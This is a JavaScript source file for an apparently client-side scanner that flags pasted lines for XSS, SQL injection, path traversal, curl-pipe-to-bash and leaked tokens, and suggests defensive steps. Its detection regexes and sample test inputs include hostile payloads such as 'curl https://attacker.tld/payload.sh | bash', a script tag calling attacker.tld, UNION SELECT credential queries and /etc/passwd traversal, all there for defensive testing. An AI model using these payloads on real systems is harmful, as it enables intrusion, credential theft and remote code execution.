// app.js
(() => {
  "use strict";

  // ---------- Utilities ----------
  const $ = (id) => document.getElementById(id);

  function clamp(n, a, b) { return Math.max(a, Math.min(b, n)); }

  // Shannon-ish entropy estimator over characters (0..~6 for typical text)
  function estimateEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    let H = 0;
    const len = str.length;
    for (const c of freq.values()) {
      const p = c / len;
      H -= p * Math.log2(p);
    }
    return +H.toFixed(2);
  }

  function pct(n) { return `${Math.round(clamp(n, 0, 100))}%`; }

  function safeText(s, max = 220) {
    const t = (s ?? "").toString().trim();
    if (t.length <= max) return t;
    return t.slice(0, max - 1) + "…";
  }

  // ---------- Rules / Heuristics ----------
  const RX = {
    url: /\bhttps?:\/\/[^\s]+/i,
    email: /\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/i,
    jsScheme: /\bjavascript\s*:/i,
    dataScheme: /\bdata\s*:/i,
    inlineScript: /<\s*script\b[^>]*>/i,
    eventHandler: /\bon\w+\s*=/i,                 // onerror=, onclick= ...
    base64: /\b(?:[A-Za-z0-9+\/]{40,}={0,2})\b/,
    sqlUnion: /\bunion\s+select\b/i,
    sqlTautology: /(\bor\b|\band\b)\s+1\s*=\s*1/i,
    sqlSleep: /\bsleep\s*\(\s*\d+/i,
    sqlComment: /--\s|\/\*|\*\//,
    pathTraversal: /(\.\.\/|%2e%2e%2f|%2e%2e\\|\.{2}\\)/i,
    sensitivePaths: /(\/etc\/passwd|\/proc\/self\/environ|windows\\system32|cmd\.exe|powershell\.exe)/i,
    curlPipe: /\bcurl\b.*\|\s*(bash|sh)\b/i,
    tokenLike: /\b(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9._-]{10,}\.[A-Za-z0-9._-]{10,}|AIza[0-9A-Za-z\-_]{30,}|sk-[A-Za-z0-9]{20,})\b/,
    redirectParam: /[?&](redirect|url|next|return|to)=/i
  };

  function analyzeLine(raw) {
    const s = (raw || "").trim();
    if (!s) {
      return {
        segment: "",
        type: "Empty",
        decision: "ALLOW",
        severity: 0,
        confidence: 60,
        entropy: 0,
        signals: [],
        reasons: ["Empty line"]
      };
    }

    const signals = [];
    const reasons = [];
    let severity = 0;
    let confidence = 60;
    let type = "Text";

    const ent = estimateEntropy(s);

    // Base classification
    if (RX.url.test(s)) { type = "URL"; signals.push("URL"); reasons.push("URL detected (review before opening)"); severity = Math.max(severity, 25); confidence = Math.max(confidence, 70); }
    if (RX.email.test(s)) { type = type === "URL" ? "URL+Email" : "Email"; signals.push("EMAIL"); reasons.push("Email-like string detected"); severity = Math.max(severity, 10); confidence = Math.max(confidence, 70); }

    // High-risk patterns
    const checks = [
      ["XSS_SCRIPT", RX.inlineScript, 92, "Script tag found (XSS risk)"],
      ["XSS_EVENT", RX.eventHandler, 78, "Inline event handler detected (XSS pattern)"],
      ["JS_SCHEME", RX.jsScheme, 85, "javascript: scheme detected"],
      ["DATA_SCHEME", RX.dataScheme, 70, "data: scheme detected (can embed payload)"],
      ["SQL_UNION", RX.sqlUnion, 92, "UNION SELECT indicates SQL injection attempt"],
      ["SQL_TAUTOLOGY", RX.sqlTautology, 88, "OR 1=1 tautology detected"],
      ["SQL_SLEEP", RX.sqlSleep, 80, "SLEEP() timing pattern detected"],
      ["SQL_COMMENT", RX.sqlComment, 70, "SQL comment markers detected"],
      ["TRAVERSAL", RX.pathTraversal, 92, "Directory traversal pattern detected"],
      ["SENSITIVE_PATH", RX.sensitivePaths, 92, "Sensitive file/path reference detected"],
      ["CURL_PIPE", RX.curlPipe, 92, "curl | bash pattern detected (high risk)"],
      ["TOKEN_LIKE", RX.tokenLike, 55, "Token-like string detected (possible secret)"],
      ["REDIRECT_PARAM", RX.redirectParam, 35, "Redirect-like parameter present (open redirect risk)"]
    ];

    for (const [sig, rx, sev, why] of checks) {
      if (rx.test(s)) {
        signals.push(sig);
        reasons.push(why);
        severity = Math.max(severity, sev);
        confidence = Math.max(confidence, sev >= 90 ? 93 : sev >= 70 ? 88 : 75);
      }
    }

    // Base64 heuristic
    if (RX.base64.test(s) && s.length > 60) {
      signals.push("BASE64_LIKE");
      reasons.push("Base64-like blob detected (may hide payload)");
      severity = Math.max(severity, 55);
      confidence = Math.max(confidence, 80);
    }

    // Entropy bumps: high-entropy often indicates secrets/encoded payloads
    if (ent >= 4.5) {
      signals.push("HIGH_ENTROPY");
      reasons.push("High entropy string (encoded payload or secret-like)");
      severity = Math.max(severity, 45);
      confidence = Math.max(confidence, 78);
    }

    // Decision
    let decision = "ALLOW";
    if (severity >= 80) decision = "BLOCK";
    else if (severity >= 25) decision = "WARN";

    if (decision === "ALLOW" && reasons.length === 0) {
      reasons.push("No obvious risk detected");
      confidence = Math.max(confidence, 70);
    }

    return {
      segment: s,
      type,
      decision,
      severity: clamp(severity, 0, 100),
      confidence: clamp(confidence, 50, 99),
      entropy: ent,
      signals,
      reasons
    };
  }

  function summarize(all) {
    const counts = { ALLOW: 0, WARN: 0, BLOCK: 0 };
    let peak = 0;
    let avgConf = 0;

    const signalSet = new Set();
    const topReasons = new Map();

    for (const r of all) {
      counts[r.decision] += 1;
      peak = Math.max(peak, r.severity);
      avgConf += r.confidence;

      for (const s of r.signals) signalSet.add(s);
      for (const why of r.reasons) {
        topReasons.set(why, (topReasons.get(why) || 0) + 1);
      }
    }

    avgConf = all.length ? avgConf / all.length : 0;

    // Verdict
    let verdict = "IDLE";
    let verdictClass = "clean";
    if (all.length === 0) { verdict = "IDLE"; verdictClass = "clean"; }
    else if (peak >= 80) { verdict = "DANGER"; verdictClass = "danger"; }
    else if (peak >= 25) { verdict = "REVIEW"; verdictClass = "review"; }
    else { verdict = "CLEAN"; verdictClass = "clean"; }

    // Primary reasons (top 6)
    const reasonsSorted = [...topReasons.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 6)
      .map(([k, v]) => `${k} (${v})`);

    // Recommended actions based on peak/signal presence
    const actions = [];
    const sig = (x) => signalSet.has(x);

    if (peak >= 80) {
      actions.push("Block immediate execution/opening of these inputs.");
      actions.push("Inspect surrounding context (where did this come from?).");
      actions.push("Sanitize/validate any server-side processing before use.");
      actions.push("Apply output encoding + strict CSP if this touches a UI.");
    } else if (peak >= 25) {
      actions.push("Review flagged lines before opening or running anything.");
      actions.push("Avoid pasting suspicious snippets into terminals or admin panels.");
      actions.push("If URL-based, open in isolated profile/sandbox.");
    } else if (all.length) {
      actions.push("No immediate threat detected (keep routine monitoring).");
      actions.push("Still avoid sharing secrets/tokens in chat or tickets.");
    }

    // Add secret hygiene if token-like/high-entropy present
    if (sig("TOKEN_LIKE") || sig("HIGH_ENTROPY")) {
      actions.push("Treat token-like/high-entropy strings as secrets: rotate/revoke if exposed.");
    }
    if (sig("CURL_PIPE")) actions.push("Never run curl|bash; review script content first.");
    if (sig("TRAVERSAL") || sig("SENSITIVE_PATH")) actions.push("Harden path handling: normalize + allowlist, deny traversal.");

    return { counts, peak, avgConf, verdict, verdictClass, signals: [...signalSet], reasonsSorted, actions };
  }

  // ---------- Tests ----------
  const TEST_A = [
    "hello world",
    "user@example.com",
    "https://example.com/login?next=/dashboard",
    "data:text/html,<script>alert(1)</script>",
    "UNION SELECT username,password FROM users --",
    "../..//etc/passwd"
  ].join("\n");

  const TEST_B = [
    "https://evil.tld/redirect?url=https://bank.tld/login",
    "<script>fetch('https://attacker.tld')</script>",
    "curl https://attacker.tld/payload.sh | bash",
    "SELECT * FROM users WHERE id=1 OR 1=1",
    "AIzaSyA-THIS_IS_FAKE_EXAMPLE_KEY_12345678901234567890",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
  ].join("\n");

  // ---------- DOM / App ----------
  function setText(id, txt) {
    const el = $(id);
    if (el) el.textContent = txt;
  }

  function render(all, meta) {
    // Verdict
    const vt = $("verdictText");
    if (vt) {
      vt.textContent = meta.verdict;
      vt.classList.remove("clean", "review", "danger");
      vt.classList.add(meta.verdictClass);
    }
    setText("peakSeverity", pct(meta.peak));
    setText("confidence", pct(meta.avgConf));

    // Signals
    const signalsBox = $("signalsBox");
    if (signalsBox) {
      signalsBox.innerHTML = "";
      const maxSignals = 12;
      const list = meta.signals.slice(0, maxSignals);
      for (const s of list) {
        const span = document.createElement("span");
        span.className = "tag";
        span.textContent = s;
        signalsBox.appendChild(span);
      }
    }

    // Lists
    const reasonsList = $("reasonsList");
    if (reasonsList) {
      reasonsList.innerHTML = "";
      for (const r of meta.reasonsSorted.length ? meta.reasonsSorted : ["No reasons yet"]) {
        const li = document.createElement("li");
        li.textContent = r;
        reasonsList.appendChild(li);
      }
    }

    const actionsList = $("actionsList");
    if (actionsList) {
      actionsList.innerHTML = "";
      for (const a of meta.actions.length ? meta.actions : ["—"]) {
        const li = document.createElement("li");
        li.textContent = a;
        actionsList.appendChild(li);
      }
    }

    // Counts
    setText("allowCount", meta.counts.ALLOW);
    setText("warnCount", meta.counts.WARN);
    setText("blockCount", meta.counts.BLOCK);

    // Table
    const tb = $("tableBody");
    if (!tb) return;

    tb.innerHTML = "";
    for (const row of all) {
      const tr = document.createElement("tr");

      const tdSeg = document.createElement("td");
      tdSeg.textContent = safeText(row.segment, 120);
      tr.appendChild(tdSeg);

      const tdType = document.createElement("td");
      tdType.textContent = row.type;
      tr.appendChild(tdType);

      const tdDec = document.createElement("td");
      const pill = document.createElement("span");
      pill.className = `pill ${row.decision.toLowerCase()}`;
      pill.textContent = row.decision;
      tdDec.appendChild(pill);
      tr.appendChild(tdDec);

      const tdSev = document.createElement("td");
      tdSev.textContent = pct(row.severity);
      tr.appendChild(tdSev);

      const tdConf = document.createElement("td");
      tdConf.textContent = pct(row.confidence);
      tr.appendChild(tdConf);

      const tdEnt = document.createElement("td");
      tdEnt.textContent = row.entropy.toFixed(2);
      tr.appendChild(tdEnt);

      tb.appendChild(tr);
    }
  }

  function updateCountsLive() {
    const inputEl = $("inputEl");
    if (!inputEl) return;

    const txt = inputEl.value || "";
    const lines = txt.split(/\r?\n/).filter(l => l.trim().length > 0).length;
    setText("linesCount", lines);
    setText("charsCount", txt.length);
  }

  function parseLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(x => x.trim())
      .filter(x => x.length > 0);
  }

  function runScan() {
    const inputEl = $("inputEl");
    if (!inputEl) return;

    const items = parseLines(inputEl.value);
    const results = items.map(analyzeLine);

    const meta = summarize(results);
    window.__VALIDOON_LAST__ = { results, meta, ts: Date.now() };

    render(results, meta);
  }

  async function pasteFromClipboard() {
    const inputEl = $("inputEl");
    if (!inputEl) return;

    try {
      const txt = await navigator.clipboard.readText();
      if (txt) inputEl.value = txt;
      updateCountsLive();
    } catch (e) {
      // Clipboard permissions can fail; do nothing
      console.warn("Clipboard read failed:", e);
    }
  }

  function clearAll() {
    const inputEl = $("inputEl");
    if (!inputEl) return;

    inputEl.value = "";
    updateCountsLive();

    // Reset UI
    render([], {
      counts: { ALLOW: 0, WARN: 0, BLOCK: 0 },
      peak: 0,
      avgConf: 0,
      verdict: "IDLE",
      verdictClass: "clean",
      signals: [],
      reasonsSorted: [],
      actions: []
    });
  }

  function exportJSON() {
    const pack = window.__VALIDOON_LAST__ || null;
    const data = JSON.stringify(pack || { error: "No scan yet" }, null, 2);

    // download
    const blob = new Blob([data], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `validoon_export_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  function bind() {
    // Required elements
    const inputEl = $("inputEl");
    const scanBtn = $("scanBtn");
    const clearBtn = $("clearBtn");
    const pasteBtn = $("pasteBtn");
    const loadA = $("loadA");
    const loadB = $("loadB");
    const exportBtn = $("exportBtn");

    if (!inputEl || !scanBtn || !clearBtn || !pasteBtn || !loadA || !loadB || !exportBtn) {
      // If anything missing, stop silently (prevents "Missing DOM element!" crashes)
      console.error("Missing required DOM elements. Check index.html IDs.");
      return;
    }

    inputEl.addEventListener("input", updateCountsLive);

    scanBtn.addEventListener("click", runScan);
    clearBtn.addEventListener("click", clearAll);
    pasteBtn.addEventListener("click", pasteFromClipboard);
    exportBtn.addEventListener("click", exportJSON);

    loadA.addEventListener("click", () => { inputEl.value = TEST_A; updateCountsLive(); runScan(); });
    loadB.addEventListener("click", () => { inputEl.value = TEST_B; updateCountsLive(); runScan(); });

    // Keyboard shortcut
    window.addEventListener("keydown", (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === "Enter") runScan();
    });

    // Initial render
    updateCountsLive();
    clearAll();
  }

  // Boot
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", bind);
  } else {
    bind();
  }
})();
